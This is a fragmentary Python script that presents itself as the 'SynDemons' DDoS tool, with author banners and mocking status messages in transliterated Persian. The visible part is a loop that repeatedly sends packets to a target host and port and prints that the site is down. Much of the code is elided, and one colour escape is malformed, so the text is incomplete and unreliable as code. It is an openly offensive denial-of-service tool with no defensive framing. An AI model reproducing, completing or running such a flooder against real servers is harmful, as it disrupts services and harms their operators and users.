...
# python 3 SynDemons Ddos Script v.0.0.1
	...
	try:
		...
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				...
				print ("\033[0m \033[94m Darhal gayesh :| \x1b[31m")
		...
		print("\x1b[91Website is down no ping recieved Demons Killed U:|\x1b[32m")
...
def usage():
 ...
 ~~~~~~   |   |     |       
	...
	SYNDemons Ddos Script v.0-Demo by ahura
...
if __name__ == '__main__':
	...
	print("\x1b[95mLOTFA SABR KNID\x1b[34m")
	...
	try:
		...
		print("\x1b[91mservee mored nazar ya off shde ya offe ya ip eshteb zdi haji\x1b[31m")
